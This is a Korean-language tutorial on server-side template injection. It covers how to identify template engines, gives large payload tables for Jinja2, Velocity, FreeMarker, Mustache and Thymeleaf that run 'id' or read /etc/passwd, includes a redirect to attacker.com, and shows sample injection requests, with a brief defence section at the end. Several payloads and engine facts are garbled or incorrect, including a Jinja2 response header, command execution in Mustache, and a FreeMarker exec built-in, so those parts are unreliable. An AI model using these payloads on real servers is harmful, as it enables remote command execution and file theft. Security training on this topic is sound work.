## SSTI (Server-Side Template Injection)

SSTI(Server-Side Template Injection)는 서버 측에서 사용하는 템플릿 엔진이 사용자 입력을 적절하게 필터링하지 않으면 발생할 수 있는 취약점입니다. 이 취약점은 공격자가 **템플릿 엔진의 기능을 악용**하여 서버 측에서 코드를 실행할 수 있게 만듭니다.

---

### 설명

웹 애플리케이션에서 템플릿 엔진(예: Jinja2, Velocity, FreeMarker 등)을 사용하여 HTML 페이지를 동적으로 생성하는 경우, 템플릿 엔진의 **입력값을 그대로 사용**하는 취약점이 존재할 수 있습니다. 이때, 사용자가 악의적인 템플릿 코드를 삽입하면 서버에서 의도치 않게 코드가 실행됩니다.
URL 파라미터(특히 OAuth redirect 등)가 직접 템플릿에 삽입되는 구조일 때만 SSTI 가능합니다. 
<br>
## 🐧 웹 애플리케이션에서 템플릿 엔진을 사용하여 HTML 페이지를 동적으로 생성하는지 판별하는 방법

#### (1) **HTTP 응답 분석하기**

웹 애플리케이션에서 템플릿 엔진을 사용하는 경우, 서버에서 동적으로 생성된 HTML 코드에 특정한 **템플릿 엔진의 흔적**이 남을 수 있습니다. 이를 통해 템플릿 엔진을 사용하고 있는지 판별할 수 있습니다.

#### (1.1) **HTML 소스 코드에 템플릿 문법 확인**

템플릿 엔진은 HTML 페이지를 동적으로 생성하는 과정에서 특정 문법을 사용합니다. 예를 들어, **Jinja2**는 `{{ }}` 문법을, **Velocity**는 `#` 문법을 사용합니다. 이러한 문법이 HTML 소스 코드에 그대로 남아 있다면 템플릿 엔진을 사용하고 있다는 증거가 됩니다.

##### 예시:

* **Jinja2**: `{{ user.name }}`
* **Velocity**: `#set($user = "admin")`
* **Freemarker**: `<#assign user="admin">`
* **Thymeleaf**: `th:text="${user.name}"`

웹 애플리케이션을 분석할 때, 개발자가 템플릿 문법을 잘 필터링하지 않으면 응답 HTML에 이러한 템플릿 문법이 그대로 노출될 수 있습니다. 만약 템플릿 엔진의 문법이 포함된 페이지가 반환된다면, 이를 사용하고 있다는 것을 알 수 있습니다.

#### (1.2) **서버 헤더에 특정 템플릿 엔진 정보가 포함된 경우**

서버 응답 헤더나 HTML 메타 태그에서 템플릿 엔진에 대한 정보를 알 수 있는 경우가 있습니다. 일부 템플릿 엔진은 디폴트로 특정 헤더를 포함하거나, 디버깅을 위해 템플릿 엔진 이름을 HTML에 주석으로 남길 수 있습니다.

##### 예시:

* **Jinja2**: 응답 헤더에서 `X-Powered-By: Jinja2` 같은 텍스트가 있을 수 있음.
* **Velocity**: `X-Powered-By: Velocity` 같은 헤더.

#### (1.3) **특정 파일 경로 및 확장자 확인**

템플릿 엔진을 사용하는 경우 서버에서는 템플릿 파일을 `.html`, `.vm`(Velocity), `.ftl`(FreeMarker) 등의 확장자로 저장하는 경우가 많습니다. URL이나 서버의 파일 경로에서 이런 확장자를 확인할 수 있다면, 템플릿 엔진이 사용되고 있을 가능성이 있습니다.

---

#### (2) **소스 코드 및 개발 환경 분석**

웹 애플리케이션의 **소스 코드**나 **개발 환경**을 분석하면 템플릿 엔진 사용 여부를 확인할 수 있습니다.

#### (2.1) **소스 코드 분석**

웹 애플리케이션의 백엔드 코드에서 템플릿 엔진 관련 라이브러리를 불러오는 부분을 찾을 수 있다면, 해당 템플릿 엔진을 사용하고 있다는 증거가 됩니다. 예를 들어:

* **Jinja2**: `from jinja2 import Template` (Python)
* **Velocity**: `org.apache.velocity.app.VelocityEngine` (Java)
* **FreeMarker**: `freemarker.template.Configuration` (Java)
* **Mustache**: `mustache.js` 또는 `Mustache.render()` (JavaScript)

애플리케이션의 코드에서 해당 라이브러리를 임포트하거나 사용하는 부분을 확인하면 템플릿 엔진을 사용하고 있는지 쉽게 알 수 있습니다.

#### (2.2) **템플릿 엔진 설정 확인**

템플릿 엔진은 설정 파일에 템플릿 경로, 데이터 전달 방식 등을 설정합니다. 애플리케이션 설정 파일에서 이러한 정보를 확인할 수 있다면 템플릿 엔진을 사용하고 있다는 것을 알 수 있습니다.

예시:

* **Jinja2**: Python의 `Flask`에서 `Flask(app)`로 설정하거나, `Jinja2` 환경 설정 파일에서 템플릿 디렉터리 경로 등을 확인.
* **Velocity**: Java 애플리케이션에서 `VelocityEngine` 설정을 확인.
* **Freemarker**: `freemarker.template.Configuration` 설정 확인.

#### (2.3) **템플릿 엔진의 디폴트 파일 경로 확인**

일부 템플릿 엔진은 템플릿 파일을 서버의 특정 디렉토리에 저장합니다. 해당 파일 경로를 알면, 템플릿 엔진을 사용하고 있다는 것을 알 수 있습니다.

##### 예시:

* **Jinja2**: `templates/` 디렉토리에서 HTML 파일을 찾을 수 있음.
* **Velocity**: `WEB-INF/templates/` 디렉토리에서 `.vm` 파일을 찾을 수 있음.
* **Freemarker**: `WEB-INF/freemarker/` 디렉토리에서 `.ftl` 파일을 찾을 수 있음.

---

#### (3) **실제 요청 및 응답 분석**

실제 웹 애플리케이션과 상호작용하면서 템플릿 엔진을 사용하는지 확인할 수도 있습니다.

#### (3.1) **템플릿 문법을 주입하여 테스트하기**

웹 애플리케이션의 입력 필드나 URL 파라미터에 템플릿 엔진 문법을 주입해 보는 방법입니다. 예를 들어, Jinja2 문법인 `{{ 7 * 7 }}`를 URL 파라미터에 입력하거나 폼에 삽입해봅니다. 만약 템플릿 엔진이 이를 처리하여 결과를 반환한다면, 해당 애플리케이션은 템플릿 엔진을 사용하고 있다는 것을 확인할 수 있습니다.

**예시 URL**: `http://example.com?username={{ 7 * 7 }}`

* 응답이 `49`라면 Jinja2를 사용하고 있다는 것을 알 수 있습니다.

#### (3.2) **서버 오류 메시지 분석**

템플릿 엔진에서 오류가 발생하면 종종 구체적인 오류 메시지가 반환되거나, 템플릿 엔진에 대한 정보가 포함된 오류 메시지가 나타날 수 있습니다. 이러한 메시지를 분석하여 템플릿 엔진을 확인할 수 있습니다.

**예시**:

* `TemplateNotFound: home.html` (Jinja2)
* `Syntax error in template` (Velocity)
* `FreemarkerParseException` (FreeMarker)

---

#### 공격의 흐름

1. **사용자 입력**: 웹 애플리케이션이 템플릿 엔진을 사용하여 동적 콘텐츠를 렌더링할 때, 사용자 입력을 템플릿에 직접 삽입합니다.
2. **템플릿 코드 삽입**: 공격자는 템플릿 엔진의 구문을 사용하여 악성 코드를 삽입합니다.
3. **서버에서 코드 실행**: 서버는 이 악성 템플릿을 실행하여 시스템에 해를 끼칠 수 있는 코드나 명령을 실행하게 됩니다.

#### 주요 템플릿 엔진

* **Jinja2** (Python 기반)
* **Velocity** (Java 기반)
* **FreeMarker** (Java 기반)
* **Thymeleaf** (Java 기반)
* **Mustache** (JavaScript 기반)

### 공격 예시

* **Jinja2**를 사용한 예시에서는 `{{ config }}`와 같은 구문을 이용하여 서버 설정을 출력하거나, 악성 코드를 실행할 수 있습니다.
* **Velocity**에서는 `#set($foo = "bar")`와 같은 구문을 사용하여 악성 코드를 주입할 수 있습니다.

### SSTI 공격 가능한 페이로드 표

| **공격 유형**             | **페이로드**                                                                                                                             |                                                |   |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------- | - |
| **SSTI (Jinja2)**     | `{{ config }}`                                                                                                                       |                                                |   |
|                       | `{{ self.__class__.__mro__[1].__subclasses__()[59]("id") }}`                                                                         |                                                |   |
|                       | `{{ ''.__class__.__mro__[1].__subclasses__()[59]("cat /etc/passwd") }}`                                                              |                                                |   |
|                       | `{{ 7 * 7 }}`                                                                                                                        |                                                |   |
| **SSTI (Velocity)**   | `#set($foo = "bar")`                                                                                                                 |                                                |   |
|                       | `#set($a = "a".class.forName("java.lang.Runtime").getDeclaredMethod("getRuntime", null).invoke(null, null).exec("cat /etc/passwd"))` |                                                |   |
|                       | `#foreach($x in ['1','2','3']) #set($y = $x.class.forName('java.lang.Runtime').getRuntime().exec('cat /etc/passwd')) #end`           |                                                |   |
| **SSTI (FreeMarker)** | `<#assign x = "12"> <#assign y = "foo"> ${x+y}`                                                                                      |                                                |   |
|                       | `<#assign cmd = "cat /etc/passwd"> <#assign result = cmd?exec()> ${result}`                                                          |                                                |   |
| **SSTI (Mustache)**   | `{{#each}}<script>console.log("Hacked!")</script>{{/each}}`                                                                          |                                                |   |
|                       | `{{#if true}}<script>window.location="http://attacker.com"</script>{{/if}}`                                                          |                                                |   |
| **SSTI (Python)**     | `{{ 7*7 }}`                                                                                                                          |                                                |   |
|                       | `{{ ''.__class__.__mro__[1].__subclasses__()[59]("id") }}`                                                                           |                                                |   |
| **SSTI (PHP)**        | \`{{ "phpinfo()"                                                                                                                     | shell\_exec }}\`                               |   |
| **SSTI (Thymeleaf)**  | \`                                                                                                                                   | \${#request.getAttribute('some\_parameter')}\` |   |
|                       | `${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}`                                                                       |                                                |   |

---

| **공격 유형**           | **페이로드**                                                                                                         | **설명**                                                     |                                           |
| ------------------- | ---------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- | ----------------------------------------- |
| **Jinja2 SSTI**     | `{{ 7 * 7 }}`                                                                                                    | Jinja2에서 숫자 계산을 수행하는 기본적인 페이로드. 서버에서 `49`라는 출력 결과를 반환하게 됨. |                                           |
|                     | `{{ config }}`                                                                                                   | 서버 설정 정보가 출력됨. 서버의 구체적인 설정이나 민감한 정보 노출 가능.                 |                                           |
|                     | `{{ ''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['os'].popen('id').read() }}`               | 시스템 명령을 실행하여 서버의 사용자 정보를 얻음. (`id` 명령어 실행)                 |                                           |
|                     | `{{ ''.__class__.__mro__[1].__subclasses__()[305].__init__.__globals__['os'].popen('cat /etc/passwd').read() }}` | 시스템에서 중요한 파일을 읽어오는 페이로드. (`/etc/passwd` 파일을 출력)            |                                           |
| **Velocity SSTI**   | `#set($foo = "Hello") #set($bar = "World") $foo $bar`                                                            | Velocity 템플릿에서 변수를 설정하고 출력하는 간단한 예시.                       |                                           |
|                     | `#foreach($i in [1..5]) $i #end`                                                                                 | 반복문을 사용하여 1부터 5까지 숫자를 출력하는 예시.                             |                                           |
|                     | `#set($exec = $toolBox.get("os")) #exec($exec)`                                                                  | 서버에서 `os` 명령어를 실행하여 정보를 가져오는 예시. (`os` 명령어 실행)             |                                           |
| **Freemarker SSTI** | `<#assign foo = "bar"> <#if foo == "bar">Success</#if>`                                                          | Freemarker 템플릿에서 조건문을 사용하여 "Success"를 출력.                  |                                           |
|                     | \`<#assign exec = "foo" > <#if exec == "foo"> \${"id"                                                            | exec} \</#if>\`                                            | Freemarker에서 시스템 명령을 실행하여 서버의 `id` 정보 출력. |
| **Mustache SSTI**   | `{{#users}} Hello, {{name}}! {{/users}}`                                                                         | 기본적인 Mustache 템플릿을 사용한 예시로, 사용자 목록을 출력하는 페이로드.             |                                           |
|                     | `{{#command}}{{command}}{{/command}}`                                                                            | 외부 커맨드를 실행하여 결과를 Mustache 템플릿에서 보여주는 페이로드.                 |                                           |
| **Thymeleaf SSTI**  | `#{T(java.lang.System).getenv()}`                                                                                | Thymeleaf 템플릿에서 Java 클래스를 호출하여 환경 변수 출력.                   |                                           |
|                     | `${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}`                                                   | 서버에서 시스템 명령을 실행하여 `/etc/passwd` 파일을 읽는 페이로드.               |                                           |

---

### 각 페이로드를 입력하는 위치 예시

#### 1. **Jinja2 템플릿에서 페이로드 삽입**

**공격 시나리오**: 사용자 입력이 템플릿에 삽입될 때, 적절히 필터링되지 않으면 공격자가 Jinja2 템플릿을 악용하여 서버에서 명령을 실행할 수 있습니다.

**URL 예시**: `http://example.com/?username={{ 7 * 7 }}`

* 이 URL을 입력하면 서버에서 `49`를 반환합니다.

**폼 입력 예시**: 로그인 폼에 입력값으로 `{{ 7 * 7 }}`를 넣고 제출하면, 서버가 이를 템플릿 엔진에 전달하고, 결과적으로 `49`가 반환됩니다.

#### 2. **Velocity 템플릿에서 페이로드 삽입**

**공격 시나리오**: 웹 애플리케이션의 Velocity 템플릿을 사용하여 서버에서 임의의 명령을 실행하도록 유도합니다.

**URL 예시**: `http://example.com?username=#set($foo = "Hello") #set($bar = "World") $foo $bar`

* 이 URL을 통해 `Hello World`가 출력됩니다.

**폼 입력 예시**: 사용자 폼에 `#foreach($i in [1..5]) $i #end`를 입력하면 1부터 5까지 출력됩니다.

#### 3. **Freemarker 템플릿에서 페이로드 삽입**

**공격 시나리오**: Freemarker 템플릿에서 시스템 명령을 실행하도록 유도하여 공격자가 서버의 파일을 열거나 실행할 수 있습니다.

**URL 예시**: `http://example.com/?cmd=<#assign foo = "bar"> <#if foo == "bar">Success</#if>`

* 이 URL을 통해 `Success`가 출력됩니다.

**폼 입력 예시**: `<#assign exec = "foo" > <#if exec == "foo"> ${"id"|exec} </#if>`를 입력하여 서버의 `id` 명령어 결과를 확인할 수 있습니다.

#### 4. **Mustache 템플릿에서 페이로드 삽입**

**공격 시나리오**: Mustache 템플릿에 악의적인 명령을 삽입하여 서버에서 명령어가 실행되도록 유도합니다.

**URL 예시**: `http://example.com/?user={{#command}}{{command}}{{/command}}`

* `command` 변수에 서버 명령어를 삽입하여 실행 결과를 반환합니다.

#### 5. **Thymeleaf 템플릿에서 페이로드 삽입**

**공격 시나리오**: Thymeleaf 템플릿을 사용하여 서버에서 명령을 실행하거나, 민감한 데이터를 노출하도록 유도할 수 있습니다.

**URL 예시**: `http://example.com/?username=#{T(java.lang.System).getenv()}`

* 이 URL을 입력하면 서버 환경 변수 정보를 출력합니다.

---

### ⭐ SSTI 페이로드

(1) 

```
xxx{{['cat /etc/passwd']|filter('system')}}bbb
```

Jinja2(Flask)나 Twig(PHP) 류의 템플릿 엔진을 공격할 때 자주 쓰이며, 성공하면 서버에서 명령이 실행될 수 있습니다.

* 템플릿 엔진이 **`{{ ... }}`** 내부를 서버에서 해석하도록 유도하고
* `system` 같은 필터를 통해 OS 명령(`cat /etc/passwd`)을 실행하려는 시도


(2) URL 파라미터(GET)로 주입 — 인코딩/비인코딩 예시

* 디코딩된 형태(읽기 쉬운 형식)

```
GET /recv_adjust_postback.php?tracker_name=Mobusi::unknown::test#{ 777 * 777 }::0&adgroup_name=test#{ 777 * 777 } HTTP/1.1
Host: 11.com
User-Agent: Mozilla/5.0 (example-scan)
Accept: */*
```

* URL 인코딩된 형태(실제 로그에 흔함)

```
GET /recv_adjust_postback.php?tracker_name=Mobusi%3A%3Aunknown%3A%3Atest%23%7B+777+%2A+777+%7D%3A%3A0&adgroup_name=test%23%7B+777+%2A+777+%7D HTTP/1.1
Host: 11.com
User-Agent: AttackScanner/1.0
```

(2) POST 바디로 전달 (application/x-www-form-urlencoded)

```
POST /submit HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 92

name=alice&comment={{777*777}}&tracker=@(777*777)&meta=%7B%7B+777+*+777+%7D%7D
```

(3) 광고/리포스트(postback) 형식(많이 쓰이는 위장 방식)

```
GET /recv_adjust_postback.php?app_id=8786990&tracker_name=Mobusi%3A%3Aunknown%3A%3Atest%23%7B+777+%2A+777+%7D&country=jp HTTP/1.1
Host: 11.com
Referer: https://ad.network/clk
User-Agent: curl/7.68.0
```

---
### SSTI 공격 방어 방법

1. **입력 검증**: 템플릿 엔진에 전달되는 모든 사용자 입력을 적절히 검증합니다. (예: HTML, JavaScript 필터링)
2. **템플릿 엔진 보안 설정**: 템플릿 엔진이 제공하는 보안 기능(예: `sandbox` 모드, 실행할 수 있는 명령어 제한 등)을 활성화합니다.
3. **최소 권한 원칙**: 템플릿 엔진이 실행되는 환경에서 최소한의 권한만 부여하고, 시스템 명령을 실행할 수 없도록 제한합니다.
4. **외부 라이브러리 사용 시 주의**: 보안 패치가 최신 상태인지 확인하고, 위험한 템플릿 엔진은 사용하지 않도록 합니다.
